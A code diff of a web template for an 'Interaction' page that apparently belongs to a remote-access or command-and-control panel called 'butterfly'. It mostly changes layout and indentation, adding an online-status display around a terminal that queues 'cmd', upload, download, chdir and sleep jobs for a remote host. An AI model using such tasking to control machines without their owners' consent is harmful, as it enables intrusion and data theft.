@@ -1,11 +1,17 @@
 {{define "title"}}Interaction{{end}}
 {{define "content"}}
-    <div class="titled-toggle">
-        <p>Boost Mode</p>
-        <label class="toggle">
-            <input id="boost" type="checkbox"/>
-            <span class="slider"></span>
-        </label>
+    <div class="titled-items">
+        <div class="titled-it">
+            <p class="it-title">Boost Mode</p>
+            <label class="toggle">
+                <input id="boost" type="checkbox"/>
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="titled-it">
+            <p class="it-title">Status:</p>
+            <p>Online</p>
+        </div>
     </div>
     <div class="tabs">
         <button class="active-tab" id="history-tab" aria-controls="history-body">History</button>
@@ -52,31 +58,31 @@
             });
             $('#terminal-tab').one('click', function () {
                 terminal = $('#terminal-body').terminal(function (command) {
-                        terminal.pause();
-                        if (command === '') {
-                            return;
-                        }
-                        const jobTypes = ['upload', 'download', 'chdir', 'sleep'];
-                        let job = {todo: '', is_done: false};
-                        if (jobTypes.some(t => command.startsWith(t))) {
-                            job.todo = command;
-                        } else {
-                            job.todo = 'cmd ' + command;
-                        }
-                        createJobApi(job, function (data) {
-                            retrieveReport(data.id, rep => {
-                                terminal.echo(rep);
-                                terminal.resume();
-                            }, function () {
-                                terminal.error('Failed to retrieve report!');
-                                terminal.resume();
-                            });
-                            addJobToTable(data);
+                    terminal.pause();
+                    if (command === '') {
+                        return;
+                    }
+                    const jobTypes = ['upload', 'download', 'chdir', 'sleep'];
+                    let job = {todo: '', is_done: false};
+                    if (jobTypes.some(t => command.startsWith(t))) {
+                        job.todo = command;
+                    } else {
+                        job.todo = 'cmd ' + command;
+                    }
+                    createJobApi(job, function (data) {
+                        retrieveReport(data.id, rep => {
+                            terminal.echo(rep);
+                            terminal.resume();
                         }, function () {
-                            terminal.error('Failed to create job!');
+                            terminal.error('Failed to retrieve report!');
                             terminal.resume();
                         });
-                    }, {
+                        addJobToTable(data);
+                    }, function () {
+                        terminal.error('Failed to create job!');
+                        terminal.resume();
+                    });
+                }, {
                     greetings: 'Welcome to butterfly!',
                     height: 570
                 });
